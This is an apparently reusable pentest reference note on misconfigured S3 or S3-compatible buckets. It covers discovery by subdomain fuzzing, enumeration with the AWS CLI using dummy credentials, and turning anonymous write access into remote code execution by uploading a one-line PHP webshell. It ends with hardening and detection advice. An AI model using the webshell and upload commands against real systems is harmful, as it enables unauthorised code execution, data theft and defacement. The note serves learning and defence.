---
topic: s3-misconfiguration
tags: [cloud, aws, s3, misconfiguration]
---

# Misconfigured S3 — open buckets and webshells

**English** | [🇪🇸 Español](s3-misconfiguration.md)

> Reusable note. Do not publish real keys or data.

## Idea

An S3 bucket (or a compatible service such as LocalStack or MinIO) can be left with **anonymous read or write**. If it is also mounted over a web server's `document root`, uploading an object equals uploading an executable file: the storage misconfiguration becomes remote code execution.

## How it is found

- **Vhost**: subdomain fuzzing (`s3.domain.tld`, `bucket.domain.tld`).
- **Different response**: a `404` with an XML body (`<Error><Code>AccessDenied`) betrays S3 behind Apache/nginx.
- **DNS**: a CNAME to `*.amazonaws.com`.
- **Source code**: `s3://` paths, `AWS_ENDPOINT`, `bucket_name` in leaked JS or `.env`.

```bash
ffuf -u http://<HOST> -H "Host: FUZZ.<DOMAIN>" -w subdomains.txt -fs <404_size>
curl -s http://s3.<DOMAIN>/
```

## Enumerating with the AWS CLI

```bash
aws configure set aws_access_key_id temp
aws configure set aws_secret_access_key temp
aws configure set default.region us-east-1

aws --endpoint=http://s3.<DOMAIN> s3 ls
aws --endpoint=http://s3.<DOMAIN> s3 ls s3://<BUCKET>
aws --endpoint=http://s3.<DOMAIN> s3 cp shell.php s3://<BUCKET>/shell.php
```

Notes:

- If the endpoint does not enforce IAM, made-up credentials work: **missing authentication is the flaw**.
- `--no-sign-request` works against real AWS for public buckets.
- On real AWS, `aws s3 ls s3://bucket` without credentials tests anonymous read; `--acl public-read` on upload tests write.

## When it turns into RCE

| Condition | Result |
|---|---|
| Bucket = document root | The uploaded object is served and executed |
| Allowed extension (`.php`, `.aspx`, `.jsp`) | Direct webshell |
| No `Content-Type` validation | Served as a script |
| External bucket behind a CDN | Static content only: no execution |

```bash
cat > shell.php <<'PHP'
<?php system($_GET['cmd']); ?>
PHP
aws --endpoint=http://s3.<DOMAIN> s3 cp shell.php s3://<BUCKET>/shell.php
curl -s "http://<DOMAIN>/shell.php?cmd=id"
```

## Impact beyond the webshell

- **Data leak**: list buckets holding backups, `.env`, database dumps and keys.
- **Overwrite**: replace the `index.html` or JS served to users (defacement, skimming).
- **Supply chain**: plant a binary or package another system downloads from the bucket.
- **Cost**: mass writes into a billable bucket.

## Hardening

- **Block Public Access** on the account and the bucket.
- Bucket policies that deny `s3:*` without a corporate `aws:PrincipalArn`.
- Keep the bucket outside the `document root`; never serve PHP from object storage.
- Force `Content-Type`/`Content-Disposition` and disable execution in the upload directory.
- Audit with `aws s3api get-bucket-acl` and `get-bucket-policy`; enable encryption and versioning.
- In lab setups (LocalStack/MinIO), do not expose the admin port.

## Detection

- `PUT`/`POST` to buckets from unusual IPs and from processes other than CI.
- Repeated `AccessDenied` followed by a successful listing (enumeration).
- New objects with executable extensions (`.php`, `.aspx`, `.jsp`, `.sh`).
- Requests to `<bucket>.s3.amazonaws.com` from the application web server.

## References

- <https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html>
- <https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-s3-athena-and-glacier-enum>
- <https://attack.mitre.org/techniques/T1530/>
